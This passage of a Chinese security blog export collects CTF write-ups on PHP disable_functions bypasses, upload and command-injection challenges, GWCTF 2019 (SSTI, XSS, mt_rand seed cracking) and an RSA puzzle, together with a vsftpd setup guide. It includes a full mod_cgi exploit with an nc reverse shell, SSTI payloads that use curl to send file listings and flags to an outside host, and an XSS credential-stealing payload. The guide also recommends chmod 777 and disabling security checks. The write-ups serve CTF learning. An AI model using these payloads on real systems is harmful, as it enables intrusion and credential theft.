最后访问shell.ant即可进行反弹shell。 这里也参考了l3m0n师傅github里关于bypass的脚本，详细完备，学到很多。 &lt;?php$cmd = \"nc -c '/bin/bash' 172.16.15.1 4444\"; //command to be executed$shellfile = \"#!/bin/bash\\n\"; //using a shellscript$shellfile .= \"echo -ne \\\"Content-Type: text/html\\\\n\\\\n\\\"\\n\"; //header is needed, otherwise a 500 error is thrown when there is output$shellfile .= \"$cmd\"; //executing $cmdfunction checkEnabled($text, $condition, $yes, $no) //this surely can be shorter{ echo \"$text: \" . ($condition ? $yes : $no) . \"&lt;br&gt;\\n\";}if (!isset($_GET['checked'])) { @file_put_contents('.htaccess', \"\\nSetEnv HTACCESS on\", FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked} else { $modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled? $writable = is_writable('.'); //current dir writable? $htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled? checkEnabled(\"Mod-Cgi enabled\", $modcgi, \"Yes\", \"No\"); checkEnabled(\"Is writable\", $writable, \"Yes\", \"No\"); checkEnabled(\"htaccess working\", $htaccess, \"Yes\", \"No\"); if (!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess)) { echo \"Error. All of the above must be true for the script to work!\"; //abort if not } else { checkEnabled(\"Backing up .htaccess\", copy(\".htaccess\", \".htaccess.bak\"), \"Suceeded! Saved in .htaccess.bak\", \"Failed!\"); //make a backup, cause you never know. checkEnabled(\"Write .htaccess file\", file_put_contents('.htaccess', \"Options +ExecCGI\\nAddHandler cgi-script .dizzle\"), \"Succeeded!\", \"Failed!\"); //.dizzle is a nice extension checkEnabled(\"Write shell file\", file_put_contents('shell.dizzle', $shellfile), \"Succeeded!\", \"Failed!\"); //write the file checkEnabled(\"Chmod 777\", chmod(\"shell.dizzle\", 0777), \"Succeeded!\", \"Failed!\"); //rwx echo \"Executing the script now. Check your listener &lt;img src = 'shell.dizzle' style = 'display:none;'&gt;\"; //call the script }}?&gt; 本题解题的时候就是用的这个脚本。 解题进入题目常规操作，蚁剑连接，注意连接的时候编码器需要选择base64。同样是终端输入命令无效。看一下phpinfo，可以发现，支持cgi，同时根据题目描述，利用cgi进行bypass，还是两种方式：蚁剑bypass插件 or 手工bypass。 利用蚁剑插件模式选择Apache_mod_cgi即可，详细参考这里。 手工bypass前面说了，这题用的l3m0n师傅的脚本，直接将exp.php(前面贴的代码)上传到web文件夹，并访问该文件，回显如下： 再看蚁剑里的情况： 可以发现，多了几个文件，其中shell.dizzle文件里包含我们要执行的命令，我们通过更改该文件即可拿到flag(这里注意：/flag是644权限，www-data用户无法通过读文件的形式读到内容, 需要执行拥有 SUID 权限的 tac 命令(具体看 /start.sh)来获取 flag)： 然后在浏览器访问shell.dizzle即可拿到flag了。 可参考：https://www.anquanke.com/post/id/195686 Json Serializer UAF利用Json序列化程序中的堆溢出进行bypass。 关于利用Json_Serializer_UAF bypass PHP-Json-bypass漏洞利用json序列化程序中的堆溢出触发，以绕过functions_disable并执行系统命令，影响范围是Linux，php 7.1-7.3。 利用条件 1、Linux 操作系统 2、PHP 版本：7.1 - all versions to date、7.2 &lt; 7.2.19 (released: 30 May 2019)、7.3 &lt; 7.3.6 (released: 30 May 2019) bypass流程 1、查看PHP版本 2、上传exp执行或者利用蚁剑插件bypass 这里附一个网上找到大师傅写的exp。我从师傅那里也fork了exp的库，可到我的github共同学习。 解题进入题目，仍然给了小马，连接上仍然没有权限。可以选择利用蚁剑插件或者上面的exp进行bypass拿到www-data的用户权限。（再提示一下：bypass插件只有Linux下的蚁剑可用哦） 利用蚁剑插件参考官方的wp，我们来实现一下。 连接上之后，在主页面选择绕过disable_functions插件： 然后选择Json Serializer UAF–&gt;开始bypass 之后就能拿到www-data权限的shell了，注意这个用户权限不足以读取flag，因此cat命令读取不到flag，需要用tac命令来读取： 手工bypassexp已经给了，自己可以尝试下，这两天事情多，几个题都是用蚁剑秒的。 参考：https://www.anquanke.com/post/id/195686#h3-4https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/6 PHP-FPM在服务器支持PHP-FPM的情况下，利用PHP的内核变量进行bypass，原理与利用LD-PRELOAD进行bypass是一样的。 关于利用PHP-FPM bypass Fastcgi 是一种通讯协议，用于Web服务器与后端语言的数据交换；PHP-FPM则是php环境中对Fastcgi协议的管理程序实现。 Nginx为fastcgi 提供了 fastcgi_param 来主要处理映射关系，将 Nginx 中的变量翻译成 PHP 能够理解的变量。 利用条件 1、PHP必须运行于PHP-FPM/FastCGI模式下 2、内核版本必须大于2.98 3、open_basedir = off bypass流程 1、查看phpinfo是否支持PHP-FPM/FastCGI 2、上蚁剑插件 or exp 解题进入题目，一如既往蚁剑连接，这个题其实与蚁剑原版有点出入，蚁剑题解里写的本题环境是支持putenv的，那就和利用LD_PRELOAD绕过姿势一样了，但是试了，没成功，后来用蚁剑插件的时候发现了问题。 利用蚁剑插件像前面的操作一样：选择上bypass插件 -&gt; 选择模式 -&gt; FPM/FCGI这个时候发现问题所在了： 可以看到，本题环境并没有putenv，用LD_PRELOAD的姿势能过就怪了… 然后在地址里选上最后一个并开始： 成功执行之后，连接上题目环境，再刷新一下web目录看一下： 发现多了一个.antproxy.php没错！这就是蚁剑写入的另一个shell文件，我们回去把连接shell的url换成这个shell文件的url，链接密码不变，例如： url：http://change-123456/shell.php，连接密码：cmd改为url：http://change-123456/.antproxy.php，连接密码：cmd 再次连接即可拿到拥有www-data权限的shell，注意此时cat命令还是读取不到flag的，需要用tac命令来拿到flag: 参考：https://www.freebuf.com/articles/web/82801.htmlhttps://www.anquanke.com/post/id/195686#h3-4 GC UAF利用GC UAF导致的PHP代码执行漏洞进行bypass 关于利用GC UAF PHP是一门托管型语言，在PHP编程中程序员不需要手工处理内存资源的分配与释放(使用C编写PHP或Zend扩展除外)，这就意味着PHP本身实现了垃圾回收机制(Garbage Collection)。 该机制存在UAF漏洞，利用该漏洞可以执行命令等，也可以完成对functions_disable的bypass 利用条件 PHP版本满足： 7.0 - all versions to date 7.1 - all versions to date 7.2 - all versions to date 7.3 - all versions to date bypass流程 1、查看PHP版本信息 2、利用蚁剑插件 or exp 解题进入题目，蚁剑连接，查看phpinfo发现满足要求，那么即可利用该方式进行bypass 利用蚁剑插件蚁剑连接之后，选择上bypass插件 -&gt; 选择模式 -&gt; GC UAF 然后点击开始，即可拿到www-data权限的shell，利用tac命令即可读到flag： 手工bypass可以利用这个exp进行 参考：https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/7https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass 持续更新。。。","link":"/2020/03/06/CTFHub-bypass-functions-disable/"},{"title":"CTFHub部分记录","text":"技能树里几道学到新知识的题目的记录，还不错还不错😎 技能树-web-00截断这一题考察00截断，但是不是单纯地在文件名后缀处截断，那种方法只能绕过前端，但是本题后端还会有检测，因此需要构造绕过后端检测的截断。看到群里有些师傅问一些爆破文件名之类问题…感觉还是写一下题解吧，希望能有帮助，自己也记录一下。（为了写题解，又花30金币…LinE师傅求报销啊） 题目分析拿到题目先看看源码： if (!empty($_POST['submit'])) { $name = basename($_FILES['file']['name']); $info = pathinfo($name); $ext = $info['extension']; $whitelist = array(\"jpg\", \"png\", \"gif\"); if (in_array($ext, $whitelist)) { $des = $_GET['road'] . \"/\" . rand(10, 99) . date(\"YmdHis\") . \".\" . $ext; if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) { echo \"&lt;script&gt;alert('上传成功')&lt;/script&gt;\"; } else { echo \"&lt;script&gt;alert('上传失败')&lt;/script&gt;\"; } } else { echo \"文件类型不匹配\"; }} 通过审计可知，代码的逻辑如下： 1、首先取到上传文件的扩展名$ext 2、将扩展名与白名单进行匹配，为jpg、png或gif才能通过第一次过滤 3、扩展名匹配之后，为上传的文件构造了一个新的存储路径$des，这个地方用了rand()函数，就看到有些师傅问是不是要爆破…看到后面的$ext怎么能想着爆破呢？这是正常上传图片的存储路径，人家后缀都是通过匹配的$ext，自己的小马肯定是php啊… 这题是考察00截断的，突破点也很明显了：构造$des的时候，首先取的是road参数的内容/var/www/html/upload/，想到看到的绕过后端检测的一篇文章，需要在存储路径的地方构造截断：/var/www/html/upload/shell.php%00。这里注意一下：存储路径后面要加一个php后缀的文件名，然后利用%00进行截断，这样上传文件的内容就存到了shell.php里，还要注意要用%00截断，由于内容在请求头中，直接在hex中改00会报bad request。 解题抓包改包如下：成功上传，蚁剑连接url/var/www/html/upload/shell.php即可。 命令注入-综合一个考察点比较全面，但是也是比较入门的题目。主要考察了对连接符、特殊文件名、读取文件命令等过滤的绕过。这个题解题的时候走了一大圈弯路，并且还撞到了墙上，后来用正常姿势解了出来… 题目分析既然比较综合，先看看源码： &lt;?php$res = FALSE;if (isset($_GET['ip']) &amp;&amp; $_GET['ip']) { $ip = $_GET['ip']; $m = []; if (!preg_match_all(\"/(\\||&amp;|;| |\\/|cat|flag|ctfhub)/\", $ip, $m)) { $cmd = \"ping -c 4 {$ip}\"; exec($cmd, $res); } else { $res = $m; }}?&gt; 可以看到对ip传参内容中的连接符、空格、cat命令、flag字段进行了过滤，对空格过滤很简单，${IFS}就行，之前的一篇博客也写过，对cat和flag的过滤也很简单，用\\即可绕过：ca\\t f\\lag，关键就在于对|、&amp;、;三个连接符的过滤，最初没有考虑是GET传参，忘记了用%0a代替;，而是选择用8/16进制进行绕过，从而跳进了大坑…这种方法构造思路就是：利用字符的ascii码对应的8/16进制表示字符，结合printf命令输出字符串，然后利用$将字符串当作命令执行，比如： ls：$(printf${IFS}\"\\154\\163\") 但是构造的payload一直没打通，于是本地测了一下：原来是输出的内容被当作ip的一部分了… 但是没搞懂为啥这样构造出来的字符会被当做前面命令的一部分… 解题由于是GET传参，利用连接符的url编码就能绕过，比如;对应%0a，构造payload如下： ip=127.0.0.1%0acd${IFS}fl\\ag_is_here%0aca\\t${IFS}fl\\ag_64331483515023.php 即可拿到flag：这里的cat其实还可以用more、less、tail、sort命令替换，具体可以查一下几个命令的区别。对文件名的过滤也可以通过利用变量的形式来绕过，网上有很多例子可以参考，这里不再写了。 关于更多命令注入的绕过姿势可以参考这里。","link":"/2020/03/03/CTFHub%E9%83%A8%E5%88%86%E8%AE%B0%E5%BD%95/"},{"title":"GWCTF2019复现","text":"去年安恒决赛，同时还进行着GWCT，当时没做，现在复现复现💩 [GWCTF 2019]我有一个数据库考察[CVE-2018-12613]-PhpMyadmin后台文件包含漏洞，参考这里。 解题扫后台发现robots.txt和phpmyadmin两个页，进入phpmyadmin发现版本是4.8.1的，上面说到的漏洞刚好支持的是4.8.0和4.8.1，因此拿payload尝试一下，发现直接能打通： index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd 那么再构造payload拿flag就行了： index.php/?target=db_sql.php%253f/../../../../../../../../etc/passwd [GWCTF 2019]枯燥的抽奖考察php伪随机的漏洞：如果mt_srand()使用同一个seed，生成的随机数是可以爆破出seed的。 题目分析查看源码： $(\"#div1\").load(\"check.php #p1\");$(\".close\").click(function(){ $(\"#myAlert\").hide();}); 可以看到，存在check.php，访问该页面可以拿到如下源码： &lt;?php#这不是抽奖程序的源代码！不许看！header(\"Content-Type: text/html;charset=utf-8\");session_start();if(!isset($_SESSION['seed'])){$_SESSION['seed']=rand(0,999999999);}mt_srand($_SESSION['seed']);$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }$str_show = substr($str, 0, 10);echo \"&lt;p id='p1'&gt;\".$str_show.\"&lt;/p&gt;\";if(isset($_POST['num'])){ if($_POST['num']===$str){x echo \"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p&gt;\"; } else{ echo \"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;\"; }}show_source(\"check.php\"); 可以看到，存在mt_srand()，mt_rand()两个函数，并且session是用的随机数设置的，那么先将伪随机数转化为php_mt_seed可识别的数据： str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'str2='VJozuuy4YQ'str3 = str1[::-1]length = len(str2)res=''for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' ' breakprint（res） 然后用php_mt_seed爆破伪随机数： 然后利用题目源码，构造POC： &lt;?phpmt_srand(980044562);$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }echo $str;?&gt; 把结果输入即可拿到flag [GWCTF 2019]你的名字考察flask的SSTI，以及利用curl反弹shell 题目分析进入题目是一个输入框，很容易想到是sql注入，但是试了好一会儿没有效果，抓包看返回头可以得知是python的后端，因此认定是SSTI。 用2进行测试时报错，猜想是双括号被ban了，后来用{}与%组合的方式可以，但是还有很多关键词被ban了，参考到一位师傅的题解，发现他认为后端的过滤是这么写的：(应该是FUZZ出来的吧) blacklist = ['import', 'getattr', 'os', 'class', 'subclasses', 'mro', 'request', 'args', 'eval', 'if', 'for', ' subprocess', 'file', 'open', 'popen', 'builtins', 'compile', 'execfile', 'from_pyfile', 'local', 'self', 'item', 'getitem', 'getattribute', 'func_globals', 'config']for no in blacklist: while True: if no in s: s = s.replace(no, '') else: breakreturn s 这种过滤，利用黑名单中最后一个词进行混淆来过滤是最好了，即if=&gt;iconfigf，因为是用黑名单的关键词按顺序来对输入进行替换的，那么最后一个config被替换之后，过滤也就结束了。 同时还要利用VPS来接收结果，在BUU中开了一台内网靶机，构造最终payload如下： #获取文件名{% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen('curl http://174.0.231.221:1234/ -d `ls /`;') %}1{% endiconfigf %} #拿flag{% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclasconfigses__()[59].__init__.func_glconfigobals.linecconfigache.oconfigs.popconfigen('curl http://174.0.231.221:1234/ -d `cat /flag_1s_Hera`;') %}1{% endiconfigf %} 成功打出flag： [GWCTF 2019]mypassword考察XSS 题目分析注册并登录之后，在feedback页面看到了一个大大的输入框，查看源码如下： if(is_array($feedback)){ echo \"&lt;script&gt;alert('反馈不合法');&lt;/script&gt;\"; return false;}$blacklist =['_','\\'','&amp;','\\\\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];foreach ($blacklist as $val) { while(true){ if(stripos($feedback,$val) !== false){ $feedback = str_ireplace($val,\"\",$feedback); } else{ break; } }} 通过观察黑名单中的内容，又是一个大大的输入框，指定是XSS了，参考别的师傅的题解讲到本题存在CSP，不能注入外部的JS，那肯定就需要在内部JS上动手脚，逐个页面看源码，结果在登陆页面看到存在login.js，源码如下： if (document.cookie &amp;&amp; document.cookie != '') { var cookies = document.cookie.split('; '); var cookie = {}; for (var i = 0; i &lt; cookies.length; i++) { var arr = cookies[i].split('='); var key = arr[0]; cookie[key] = arr[1]; } if(typeof(cookie['user']) != \"undefined\" &amp;&amp; typeof(cookie['psw']) != \"undefined\"){ document.getElementsByName(\"username\")[0].value = cookie['user']; document.getElementsByName(\"password\")[0].value = cookie['psw']; }} 这里记住密码功能会从Cookie中取出用户名和密码并赋值给username和password，因此我们可以利用这个内部JS来构造payload进行XSS，这里我们可以用BUU的requestbin来接受反馈。 在feedback页面构造如下payload提交： &lt;inpcookieut type=\"text\" name=\"username\"&gt;&lt;/inpcookieut&gt;&lt;inpcookieut type=\"text\" name=\"password\"&gt;&lt;/inpcookieut&gt;&lt;scricookiept scookierc=\"./js/login.js\"&gt;&lt;/scricookiept&gt;&lt;scricookiept&gt; var uname = documcookieent.getElemcookieentsByName(\"username\")[0].value; var passwd = documcookieent.getElemcookieentsByName(\"password\")[0].value; var res = uname + \" \" + passwd; documcookieent.locacookietion=\"http://http.requestbin.buuoj.cn/?a=\"+res;&lt;/scricookiept&gt; 等一段时间之后，即可在requestbin看到回显：","link":"/2020/03/04/GWCTF2019%E5%A4%8D%E7%8E%B0/"},{"title":"FTP服务器搭建及典型问题的解决","text":"SSH管理远程Linux服务器少不了文件的传输，虽然lrzsz能够解决本地与远程服务器之间文件传输的问题，使用sz/rz即可，比如： sz filename #发送一个文件到本地sz filename1 filename2 #发送多个文件到本地sz dir/* #发送dir目录下的所有文件，不包含dir下的文件夹 从本地传文件到服务器在终端输入rz即可。参考这里。 但是lrzsz处理小文件可以，处理大文件效果就不太好，因此，可以选择另一种方式，没错，搭建一个FTP服务器。而且FTP服务器能支持多人对文件的共享。 搭建FTP服务器我的服务器是CentOS的，因此下面的配置以CentOS下的配置为例，不过其他Linux系统大同小异，根据个人情况配置即可。 安装vsftpdLinux下轻便的的ftp程序应该就是vsftpd了，这里我们直接yum安装： yum install -y vsftpd 配置vsftpdvsftpd的配置目录为/etc/vsftpd，包含下列的配置文件： vsftpd.conf为主要配置文件 ftpusers配置禁止访问 FTP 服务器的用户列表 user_list配置用户访问控制 这里我们主要对vsftpd.conf进行配置，这里可以先用下面这条命令看初始的配置有哪些： cat /etc/vsftpd/vsftpd.conf | grep -v \"#\" | more 各项配置的规则如下： # 开启匿名登录anonymous_enable=YES# 允许使用本地帐户进行FTP用户登录验证local_enable=YES# 允许写write_enable=YES# 设置本地用户默认文件掩码022local_umask=022# 允许匿名上传anon_upload_enable=YES# 允许匿名创建新目录anon_mkdir_write_enable=YES# 同时开放其它权限anon_other_write_enable=YES# 可以发送消息当访问某个目录时dirmessage_enable=YES# 开启上传下载记录xferlog_enable=YES# 数据链通过20端口建立connect_from_port_20=YES# 允许其它用户上传匿名文件#chown_uploads=YES# 所有用户#chown_username=whoever# 日志保存到#xferlog_file=/var/log/xferlog# 日志标准输出xferlog_std_format=YES# 空闲会话时间#idle_session_timeout=600# 数据连接超时时间#data_connection_timeout=120# 隔离的安全用户#nopriv_user=ftpsecure# 开启异步数据线程#async_abor_enable=YES# 开启ASCII协议上传ascii_upload_enable=YES# 开启ASCII协议下载ascii_download_enable=YES# 开启邮箱验证#deny_email_enable=YES# 拒绝的邮箱列表#banned_email_file=/etc/vsftpd/banned_emails# 是否允许直接获取子目录信息#ls_recurse_enable=YES# 监听IPv4listen=NO# 监听IPv6和监听IPv4listen_ipv6=YES# 虚拟用户启用pam认证pam_service_name=vsftpd# 用户组管理userlist_enable=YES# 访问控制tcp_wrappers=YES# 允使用被动模式pasv_enable=YES# 指定使用被动模式时打开端口的最小值pasv_min_port=10060# 指定使用被动模式时打开端口的最大值。pasv_max_port=10090# 用户宽带限制200kps#local_max_rate=200000# 登录后欢迎内容ftpd_banner=Welcome to My FTP service.# ---------开启虚拟用户组参数--------# 开启虚拟用户guest_enable=YES# 主虚拟用户名vsftpd，等下会建立guest_username=vsftpd# 虚拟用户配置（可以对每一个虚拟用户进行单独的权限配置）user_config_dir=/etc/vsftpd/vconf# 启用限定用户在其主目录下chroot_local_user=YES# 开启用户列表chroot管理chroot_list_enable=YES# chroot管理的用户列表（一行一用户,虚拟用户都要添加进去）# 当设置用户只能在登录目录时，chroot管理的用户为不受限制，否则相反chroot_list_file=/etc/vsftpd/chroot_list# 允许chroot管理用户进行写操作allow_writeable_chroot=YES# ---------虚拟用户高级参数（请选择一组）--------# 虚拟用户和本地用户有相同的权限virtual_use_local_privs=YES# 虚拟用户和匿名用户有相同的权限，默认是NOvirtual_use_local_privs=NO# 虚拟用户具有写权限（上传、下载、删除、重命名）virtual_use_local_privs=YESwrite_enable=YES# 虚拟用户不能浏览目录，只能上传文件，无其他权限virtual_use_local_privs=NOwrite_enable=YESanon_world_readable_only=YESanon_upload_enable=YES# 虚拟用户只能下载文件，无其他权限virtual_use_local_privs=NOwrite_enable=YESanon_world_readable_only=NOanon_upload_enable=NO# 虚拟用户只能上传和下载文件，无其他权限virtual_use_local_privs=NOwrite_enable=YESanon_world_readable_only=NOanon_upload_enable=YES# 虚拟用户只能下载文件和创建文件夹，无其他权限virtual_use_local_privs=NOwrite_enable=YESanon_world_readable_only=NOanon_mkdir_write_enable=YES# 虚拟用户只能下载、删除和重命名文件，无其他权限virtual_use_local_privs=NOwrite_enable=YESanon_world_readable_only=NOanon_other_write_enable=YES 而我们不一定每项都进行配置，在初始的基础之上，进行如下配置即可： # 上面已经给了全部配置的含义，自己比对即可anonymous_enable=NOpam_service_name=vsftpduserlist_enable=YEStcp_wrappers=YESallow_writeable_chroot=YESlocal_root=/data/ftp/ #给ftp账户指定主目录listen_port=60021 #这里也可以不设置，默认ftp是21端口 配置完之后保存，然后重启vsftpd。 创建FTP用户首先创建一个新账户ftpuser： useradd ftpuser 然后为其设置密码： passwd ftpuser 现在这个账户其实是一个可登录的Linux用户，为了安全，我们要限制用户的权限，不能让其登录linux而只能用于登录FTP服务器： usermod -s /sbin/nologin ftpuser 指定主目录前面配置文件里看到了我们为ftp用户指定了主目录/data/ftp，但是初始情况该目录可能不存在，需要新建文件目录： chmod a-w /data/ftp &amp;&amp; chmod 777 -R /data/ftp/pub 这里同时也为目录设置了权限，可以看到pub目录是777权限，文件的上传、下载也就在此目录之下了。 然后设置为用户主目录： usermod -d /data/ftp ftpuser 防火墙设置前面的listen_port如果更改的话，也要在防火墙来开放其端口： firewall-cmd --zone=public --add-port=60021/tcp --permanent 然后重启防火墙： firewall-cmd --reload 至此，基础的配置也就完毕了，下面进行测试。 测试服务器及问题发现连接FTP服务器可以选用一些FTP客户端软件：FileZilla Client、CuteFTP等很多，我用了FileZilla Client进行测试。 这里由于FTP的连接有两种模式：主动（POST）和被动（PASV）两种模式： POST模式：当客户端C向服务端S连接后，使用的是Port模式,那么客户端C会发送一条命令告诉服务端S(客户端C在本地打开了一个端口N在等着你进行数据连接),当服务端S收到这个Port命令后 就会向客户端打开的那个端口N进行连接，这种数据连接就生成了。 PASV模式：当客户端C向服务端S连接后，使用的是Port模式,那么客户端C会发送一条命令告诉服务端S(客户端C在本地打开了一个端口N在等着你进行数据连接),当服务端S收到这个Port命令后 就会向客户端打开的那个端口N进行连接，这种数据连接就生成了。 按照前面的基础配置在测试时发现主动和被动模式登录都存在问题 主动模式连接的问题首次连接发现可以登录，但是读取目录列表失败，报错情况如下： 根据报错提示： 状态: 已登录状态: 读取目录列表...命令: PWD响应: 257 &quot;/data/ftp&quot;命令: TYPE I响应: 200 Switching to Binary mode.命令: PORT xx,xx,xx,xx,216,94响应: 500 Illegal PORT command.命令: PASV响应: 227 Entering Passive Mode (xx,xx,xx,xx,227,27).命令: LIST错误: 20 秒后无活动，连接超时错误: 读取目录列表失败 根据报错日志，不难理解，当成功登录之后，进行目录读取，其实也就是数据传输的时候，因为是主动模式，服务器会主动向客户端这边进行连接，即向21694端口进行连接，然后就报错了，根本原因应该就是客户端机器的防火墙对该端口并没有开放，因此连接肯定是失败的。然后又采用了被动模式进行连接，即服务器开放22727端口等待客户端连接，然而还是失败了，原因何在呢？ 由于一些客观原因，我没有对自己的客户机的防火墙进行更改，而是换用被动模式，当然，也遇到了一些问题。 被动模式连接的问题采用被动连接的方式，首先需要在vsftpd.conf下进行如下配置： pasv_enable=YES #开启被动模式pasv_min_port=44550 #指定被动模式最小端口pasv_max_port=44551 #指定被动模式最大端口pasv_promiscuous=YES #关闭被动模式的安全检查(这个检查可以确保数据连接源于同一IP地址) 重启vsftpd服务 支持了被动模式，并且指定了端口开放范围，那么我们在防火墙进行端口的配置即可。 重启防火墙，然后再次测试： 可以看到目录成功列举了，问题得到解决。 上传文件失败的问题当能成功登录、成功列举目录了之后，最主要的目的当然是文件的上传和下载了，然后当去测试的时候，又出现了问题： 报错：553 Could not create file. 本来想着很简单，应该是文件夹权限的问题，但是对文件夹改了777，甚至/data都改成777了还是不行，后来查资料，网上说可能是SELinux的问题，这是个什么呢？ SELinux(Security-Enhanced Linux) 是美国国家安全局（NSA）对于强制访问控制的实现，是 Linux历史上最杰出的新安全子系统。NSA是在Linux社区的帮助下开发了一种访问控制体系，在这种访问控制体系的限制下，进程只能访问那些在他的任务中所需要文件。 –百科 SELinux 主要作用就是最大限度地减小系统中服务进程可访问的资源（最小权限原则）。 这里有一篇不错的文章可以参考。 那么我们关闭SELinux试试：setenforce 0，然后测试一下看看： 果然成了，那就是它的问题了，下面就对其进行配置先看一下权限：getsebool -a | grep ftpd # 网上是这样的allow_ftpd_anon_write --&gt; offallow_ftpd_full_access --&gt; offallow_ftpd_use_cifs --&gt; offallow_ftpd_use_nfs --&gt; offftpd_connect_db --&gt; offftpd_use_passive_mode --&gt; offftp_home_dir --&gt; off# 但是我的服务器是这样的ftpd_anon_write --&gt; offftpd_connect_all_unreserved --&gt; offftpd_connect_db --&gt; offftpd_full_access --&gt; offftpd_use_cifs --&gt; offftpd_use_fusefs --&gt; offftpd_use_nfs --&gt; offftpd_use_passive_mode --&gt; off 系统之间的差异，没办法，但是解决方式是一样的，命令行执行下面两条命令： setsebool -P ftp_home_dir 1 #这一条命令我的服务器上没执行成功setsebool -P allow_ftpd_full_access 1 然后再开启SELinux：setenforce 1 再次进行测试： 可以看到，成功上传文件，问题解决。 下载文件失败的问题尝试从服务器上下载文件时，又error了… 可以看到，下载文件时报错：550 Failed to open file.这次问题其实不复杂，很容易想到是文件权限的问题，看一下：可以看到test.cap文件是属于root用户组的，并且权限很小，你一个ftpuser用户去操作它肯定没权限，那简单，改一下不就好了：chmod -R 777 test.cap，再试试： 话说回来，如果没有特殊需要，还是用lrzsz方便…最后，希望这篇文章能够帮助到你。 参考：基于CentOS搭建FTP文件服务CentOS7安装FTP服务器553 Could not create file问题的解决","link":"/2020/04/03/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%85%B8%E5%9E%8B%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/"},{"title":"HEBCTF-easy_RSA-WriteUp","text":"很久之前做的一道题了，当时还没搭博客，只写了md，现在刚好放博客上，nice~😎 HEBCTF-easy_RSA题目代码from gmpy2 import *from Crypto.Util import number#e = have a try~p = number.getPrime(1024)q = number.getPrime(1024)nothing = 251560377963038761190200797029988859033 # getPrime(128)n = p*qfn = (p-1)*(q-1)d =inverse(e, fn)something=(p-1)d+nothingenc = pow(flag, e, p*q)print (n)#n=14284898343409519110893988467316511926370451139898930447913929171639157662416924629721731319745621456628886461208084701377746738712806909510733763533111440296587773645965346813837315287791601828684827959213005394017782134099259170149915437025962624405554913909119787918969678680969013413675883687099548278972115691260909326823826733899687527221094134484324195895781497056688836390217827814939835994217942643008875830529445666479044655104422017227768913567208280346040068940328073829553819676484041944265736136407848750757258471249497666545068872011229067294045688552723745158600169354377516976789338341197514239514943print(s)#something=286513783515614922964487317633030845022199764334523704172857900468207328275601546483407711018702750569030377856457729134725585035340273850696372794971562057097878568322145360455616114805337204320995794956912354651091693657156422658881160865975268727450032165425473533693410304381371095831091118583746948774725405739487325458903660189348971842364607739242225293967215501191421774709879078076074161789004913628127600135108988375932151821980659991278616990695976636258955726402697510230023838942094639019441749484792888646404524697026596867444210593464034174763857812793583906156073077832265794741963441612539965049158860120119167347530684129840646220683525848056119433617113962506545054683798313759769240061077256966777326661431711874356368294140866366364716767053776009140934309044595124213623948792672967896390820967208318303287692916619220370506456013211642234660990531096377697018415439879456848769444607806947569088449625print(enc)#enc=4881342612605167945566362034399587836635894621851547317823874228263412784935124440289546702719504165280607577300320293348921200397520285704213654018930232712940345612671113541266347784516634193958010265082924711886924437824841465114124020180216977559637341458252243825701112061216139287782944762861273904099742150098423639841865509382899243178009016015415485229031954926669538913188143653236257937229799801229863924027941144675212479223330496722053292471015086437410831685022807918456036289520338369388719529672585641297779845250083115247220743517626420017412100344704837819753505113936564984505444789009239645210810 代码分析 1、代码中没有给出e的值，猜测是常见的e值，尝试了65535、65537。 2、代码中给出了d和p的关系，因此可利用费马小定理求解。【费马小定理】如果p是一个质数，而整数a不是p的倍数，则有a^(p-1)≡1 mod p。 解题过程1、我们可以设A = m^(p-1)-1，其中m^(p-1) ≡ 1 mod p，故A是p的倍数，由于N = p*q，因此gcd(A,N)=p。2、由m^e ≡ c mod N得到 c = m^e - b*N（b是整数）。3、又因为 c^d ≡ m mod N，所以(m^e - b*N)^d = m mod N，进一步(m^e)^d = m mod N。4、等式两边取p-1次方，得到：(m^ed)^(p-1) mod N = m^(p-1) mod N，即：m^e(s-n) mod N = m^(p-1) mod N。5、得到A = (m^e(s-n) mod N)-1，即可求得p = gcd(A,N)。 代码如下import gmpy2from Crypto.Util.number import *n=14284898343409519110893988467316511926370451139898930447913929171639157662416924629721731319745621456628886461208084701377746738712806909510733763533111440296587773645965346813837315287791601828684827959213005394017782134099259170149915437025962624405554913909119787918969678680969013413675883687099548278972115691260909326823826733899687527221094134484324195895781497056688836390217827814939835994217942643008875830529445666479044655104422017227768913567208280346040068940328073829553819676484041944265736136407848750757258471249497666545068872011229067294045688552723745158600169354377516976789338341197514239514943enc=4881342612605167945566362034399587836635894621851547317823874228263412784935124440289546702719504165280607577300320293348921200397520285704213654018930232712940345612671113541266347784516634193958010265082924711886924437824841465114124020180216977559637341458252243825701112061216139287782944762861273904099742150098423639841865509382899243178009016015415485229031954926669538913188143653236257937229799801229863924027941144675212479223330496722053292471015086437410831685022807918456036289520338369388719529672585641297779845250083115247220743517626420017412100344704837819753505113936564984505444789009239